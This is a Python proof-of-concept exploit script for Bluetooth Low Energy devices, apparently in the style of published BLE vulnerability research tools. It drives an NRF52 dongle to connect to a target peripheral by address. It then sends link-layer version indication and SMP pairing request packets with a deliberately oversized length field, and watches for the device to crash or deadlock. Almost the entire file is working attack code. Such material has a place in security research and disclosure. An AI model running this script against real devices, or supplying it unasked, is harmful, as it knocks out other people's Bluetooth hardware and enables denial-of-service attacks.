#!/usr/bin/env python
#  
import os
import platform
import sys
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
# timeout lib
from timeout_lib import start_timeout, disable_timeout, update_timeout
from discover import discover_attacker_dongle

sleep(1.0)
# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Internal vars
none_count = 0
end_connection = False
connecting = False
slave_addr_type = 0
switch_length_pkt = False
run_script = True
disconn_count = 0
NRF52_CMD_SET_SCAN_MODE = b'\xB2'
attack = True
# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
attacker_serial_port = discover_attacker_dongle()
if None in attacker_serial_port:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)
else:
    serial_port = attacker_serial_port[0]

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 2:
    advertiser_address = sys.argv[1].lower()
else:
    advertiser_address = 'c8:c9:a3:d3:65:1e'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())



def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
          ' received\nThe device may have crashed!!!')


# disable_timeout('scan_timeout')

def scan_timeout():
    global connecting, slave_addr_type
    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    connecting = False
    start_timeout('scan_timeout', 20, scan_timeout)


def completion_timeout():
    global disconn_count, run_script
    if disconn_count < 4:
        disconn_count += 1
        print(Fore.YELLOW + 'Peripheral not responding')
    else:
        print(Fore.RED + "Peripheral seems unresponsive (deadlock).\n"
                         "Check if you can connect to the peripheral by other means (i.g., mobile app)")
        run_script = False

def set_scanmode(self):
    '''Set dongle back to scan mode (default initial mode)'''

    self.serial.write(NRF52_CMD_SET_SCAN_MODE)
    self.serial.flushInput()

# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', 2, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while(attack):
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            update_timeout('scan_timeout')
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() \
                and connecting == False:
            connecting = True
            update_timeout('scan_timeout')
            disable_timeout('crash_timeout')
            slave_addr_type = pkt.TxAdd

            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            driver.send(conn_request)
        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
            start_timeout('completion_timeout', 1.5, completion_timeout)
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            if switch_length_pkt is True:
                switch_length_pkt = False
                print(Fore.YELLOW + 'Sending oversized version indication')
                pkt[BTLE_DATA].len = 240  # The magic happens here
                end_connection = True
            driver.send(pkt)

        elif LL_SLAVE_FEATURE_REQ in pkt:
            # 1) Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
                feature_set='le_encryption+le_data_len_ext')
            driver.send(pkt)

        elif LL_VERSION_IND in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
                responder_key_distribution=0x07)
            if switch_length_pkt is False:
                switch_length_pkt = True
                print(Fore.YELLOW + 'Sending oversized pairing request')
                pairing_req[BTLE_DATA].len = 240  # The magic happens here
            driver.send(pairing_req)
            end_connection = True

        elif L2CAP_Connection_Parameter_Update_Request in pkt:
            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
                responder_key_distribution=0x07)
            if switch_length_pkt is False:
                switch_length_pkt = True
                print(Fore.YELLOW + 'Sending oversized pairing request')
                pairing_req[BTLE_DATA].len = 240  # The magic happens here
            driver.send(pairing_req)
            end_connection = True

        elif SM_Pairing_Response in pkt:
            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
            driver.send(pairing_req)  # Send an arbitrary smp packet (public key)

        elif LL_LENGTH_REQ in pkt:
            length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(length_rsp)  # Send a normal length response

        elif end_connection == True:
            end_connection = False
            disconn_count = 0
            disable_timeout('completion_timeout')
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            sleep(1)
            print(Fore.YELLOW + 'Connection reset, malformed packet was sent')
            #driver.set_scanmode()
            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)
            start_timeout('crash_timeout', 7, crash_timeout)
            if 'CONTINUE_ATTACK' in os.environ:
                attack = True
            else:
                attack = False

    sleep(0.01)